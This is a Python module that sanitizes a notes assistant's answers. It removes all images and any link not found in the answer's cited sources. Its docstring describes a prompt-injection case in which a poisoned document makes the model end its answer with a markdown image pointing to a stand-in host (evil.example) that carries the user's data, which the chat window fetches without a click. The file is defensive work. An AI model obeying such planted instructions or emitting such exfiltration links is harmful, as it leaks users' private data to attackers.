"""Output guardrails: checks in plain code, after the model, that do not depend on the model behaving.

The prompt tells the model to ignore instructions inside documents, and measurements show that mostly works, but "mostly" is not a security
property. A poisoned document can still ask the model to end its answer with an image whose address carries the user's data
(`![x](https://evil.example/c?d=...)`). A chat window that renders markdown fetches the address on its own, so the data leaves without a click.

The rule enforced here: an answer may point only to addresses that one of its own cited sources already contained, spelled exactly. Images are
never allowed, because nothing a notes assistant says needs one and they are the channel that needs no click. Anything else is replaced with a
visible marker rather than dropped silently, so the person can see that something was taken out.

It is a filter for one channel, not a defence against injection in general: a poisoned document can still make the model say something false.
That is measured separately (evals/redteam_eval.py).
"""

import re
from dataclasses import dataclass

from app.store import Hit

LINK_REMOVED = "[link removed]"
IMAGE_REMOVED = "[image removed]"

_INLINE_IMAGE = re.compile(r"!\[[^\]]*\]\([^)]*\)")
_REFERENCE_IMAGE = re.compile(r"!\[[^\]]*\]\[[^\]]*\]")
_HTML_IMAGE = re.compile(r"<img\b[^>]*>", re.IGNORECASE)
_INLINE_LINK = re.compile(r"\[([^\]]*)\]\(([^)]*)\)")
# An address: with a scheme, or starting www. It stops at whitespace, brackets, quotes and a closing parenthesis, so "(see https://x.example/a)" reads cleanly.
_ADDRESS = re.compile(r"(?:https?://|www\.)[^\s<>\"'\[\]()]+", re.IGNORECASE)
_TRAILING = ".,;:!?*_'\""


@dataclass(frozen=True)
class Sanitized:
    text: str
    links_removed: int
    images_removed: int

    @property
    def changed(self) -> bool:
        return bool(self.links_removed or self.images_removed)


def _split_trailing(address: str) -> tuple[str, str]:
    """An address followed by sentence punctuation is the address, then the punctuation."""
    core = address.rstrip(_TRAILING)
    return core, address[len(core):]


def _normalize(address: str) -> str:
    """Scheme and host are case-insensitive; the rest of an address is not. A bare www. address is read as http://www..."""
    if address[:4].lower() == "www.":
        address = "http://" + address
    scheme, separator, rest = address.partition("://")
    host, slash, path = rest.partition("/")
    return f"{scheme.lower()}{separator}{host.lower()}{slash}{path}"


def known_addresses(sources: list[Hit]) -> set[str]:
    return {_normalize(_split_trailing(m)[0]) for source in sources for m in _ADDRESS.findall(source.body)}


def sanitize_answer(text: str, cited_sources: list[Hit]) -> Sanitized:
    known = known_addresses(cited_sources)
    links = images = 0

    def drop_image(_match: re.Match) -> str:
        nonlocal images
        images += 1
        return IMAGE_REMOVED

    for pattern in (_INLINE_IMAGE, _REFERENCE_IMAGE, _HTML_IMAGE):
        text = pattern.sub(drop_image, text)

    def check_link(match: re.Match) -> str:
        nonlocal links
        label, target = match.group(1), (match.group(2).split() or [""])[0]
        if _normalize(target) in known and target.lower().startswith(("http://", "https://")):
            return match.group(0)
        links += 1
        return f"{label} {LINK_REMOVED}".strip()

    text = _INLINE_LINK.sub(check_link, text)

    def check_address(match: re.Match) -> str:
        nonlocal links
        core, tail = _split_trailing(match.group(0))
        if _normalize(core) in known:
            return match.group(0)
        links += 1
        return LINK_REMOVED + tail

    text = _ADDRESS.sub(check_address, text)
    return Sanitized(text, links, images)


def has_substance(text: str) -> bool:
    """Whether anything is left once the removal markers are set aside: an answer that was only a payload is not an answer."""
    return re.search(r"\w", text.replace(LINK_REMOVED, "").replace(IMAGE_REMOVED, "")) is not None
